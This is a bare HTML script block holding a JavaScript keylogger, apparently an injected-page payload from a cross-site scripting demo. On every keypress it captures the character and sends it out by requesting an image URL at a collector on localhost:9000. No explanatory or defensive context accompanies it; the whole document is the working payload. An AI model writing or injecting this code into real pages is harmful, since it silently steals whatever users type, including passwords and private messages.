<script>
    document.onkeypress = function KeyLogger(inp){
        key_pressed = String.fromCharCode(inp.which);
        new Image().src = "http://localhost:9000/?"+key_pressed;
    }
</script>
